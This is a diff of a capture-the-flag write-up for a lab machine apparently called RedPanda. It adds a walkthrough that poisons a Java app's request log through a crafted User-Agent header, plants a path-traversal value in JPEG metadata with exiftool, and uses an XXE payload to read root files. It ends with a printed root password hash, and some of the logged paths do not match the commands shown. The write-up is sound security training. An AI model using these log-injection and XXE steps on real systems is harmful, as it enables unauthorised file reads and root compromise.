@@ -262,33 +262,14 @@ groups
 # logs woodenk
 env
 # SHELL=/bin/bash
-# NCAT_LOCAL_ADDR=10.10.11.170
-# SUDO_GID=0
 # JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64/bin/java
 # SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
 # SUDO_USER=root
-# PWD=/home/woodenk/.tmp
 # LOGNAME=woodenk
 # MAVEN_CONFIG_HOME=/home/woodenk/.m2
 # MAVEN_VERSION=3.8.3
-# HOME=/home/woodenk
-# LANG=en_US.UTF-8
-# LS_COLORS=
-# NCAT_LOCAL_PORT=37688
-# NCAT_REMOTE_PORT=9999
-# LESSCLOSE=/usr/bin/lesspipe %s %s
-# TERM=xterm
-# LESSOPEN=| /usr/bin/lesspipe %s
-# USER=woodenk
 # MAVEN_HOME=/opt/maven
 # SHLVL=2
-# NCAT_PROTO=TCP
-# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
-# NCAT_REMOTE_ADDR=10.10.16.4
-# SUDO_UID=0
-# MAIL=/var/mail/woodenk
-# _=/usr/bin/env
-# OLDPWD=/home/woodenk
 ps auxf
 # USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 # root           1  0.0  0.5 102364 11124 ?        Ss   09:02   0:02 /sbin/init maybe-ubiquity
@@ -335,6 +316,8 @@ ls -lah /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/
 # -rw-rw-r-- 1 root root 4.3K Jun 20 13:02 MainController.java
 # -rw-rw-r-- 1 root root  779 Feb 21 18:04 PandaSearchApplication.java
 # -rw-rw-r-- 1 root root 1.8K Jun 14 14:09 RequestInterceptor.java
+ls -lah /opt/credit-score/LogParser/final/src/main/java/com/logparser/
+# -rw-rw-r-- 1 root root 3.7K Jun 20 15:43 App.java
 ```
 
 ### Running LinPeas
@@ -345,11 +328,114 @@ The CVE-2021-3560 did not work for me, or at least the [POC from secnigma][cve-3
 [x] ERROR: Accounts service and Gnome-Control-Center NOT found!!
 ```
 
+### The app workflow
+
+The app logs all the requests in `/opt/panda_search/redpanda.log`:
+
+```java
+System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);
+FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
+BufferedWriter bw = new BufferedWriter(fw);
+bw.write(responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri + "\n");
+```
+
+The target URL is extracted from the log to identify the image:
+
+```java
+String[] strings = line.split("\\|\\|");
+map.put("uri", strings[3]);
+```
+
+The author is retrieved from the metadata of the image:
+
+```java
+Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
+for(Directory dir : metadata.getDirectories()) {
+    for(Tag tag : dir.getTags()) {
+        if(tag.getTagName() == "Artist") {
+            return tag.getDescription();
+        }
+    }
+}
+```
+
+Which points the app to the corresponding credit file:
+
+```java
+String xmlPath = "/credits/" + artist + "_creds.xml";
+```
+
+And then increment the view in the author's credit file:
+
+```java
+el.getChild("views").setText(Integer.toString(views + 1));
+```
+
+Here's the whole process for a log line:
+
+```java
+Map parsed_data = parseLog(line);
+System.out.println(parsed_data.get("uri"));
+String artist = getArtist(parsed_data.get("uri").toString());
+System.out.println("Artist: " + artist);
+String xmlPath = "/credits/" + artist + "_creds.xml";
+addViewTo(xmlPath, parsed_data.get("uri").toString());
+```
+
+### Exploiting the credits and scoring!
+
+The last step evaluates a XML without restrictions: it can be used to read files. This payload from [Hacktricks][hacktricks-xxe] can be used as `apehex_creds.xml` credit file:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE lfi [ <!ENTITY key SYSTEM "file:///root/root.txt" > ]>
+<credits>
+  <author>woodenk</author>
+  <image>
+    <uri>/../../../../../../../home/woodenk/greg.jpg</uri>
+    <pwn>&key;</pwn>
+    <views>0</views>
+  </image>
+  <totalviews>0</totalviews>
+</credits>
+```
+
+The `../` are meant to undo the path to the static files:
+
+```java
+String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
+```
+
+Then to trigger the processing of this XML, the target image itself has to store the path to the credits file:
+
+```shell
+exiftool -Artists=../home/woodenk/apehex payloads/greg.jpg
+```
+
+Finally, let's poison the log file and add our own field to the path. This way, `root.jpg` will have a logged view:
+
+```shell
+curl -i -s -k -X $'GET' \
+    -H $'User-Agent: greg||/../../../../../../../home/woodenk/greg.jpg' \
+    $'http://10.10.11.170:8080/img/greg.jpg'
+```
+
+It has worked:
+
+```shell
+cat /opt/panda_search/redpanda.log 
+# 200||10.10.16.4||greg||../../../../../../../tmp/root.jpg||/img/greg.jpg
+```
+
+Ok, you have to be patient for this one! I literally had time to fetch food before the server updated my XML...
+
+> `root:$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL/l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7:::`
 
 [acunetix]: https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
 [author-profile]: https://app.hackthebox.com/users/25507
 [cve-3560-poc]: https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
 [hacktricks-ssti]: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java
+[hacktricks-xxe]: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file
 [panda-stats]: images/panda-stats.png
 [panga-search]: images/panga-search.png
 [spring-boot-template-engine]: https://www.baeldung.com/spring-template-engines#thymeleaf
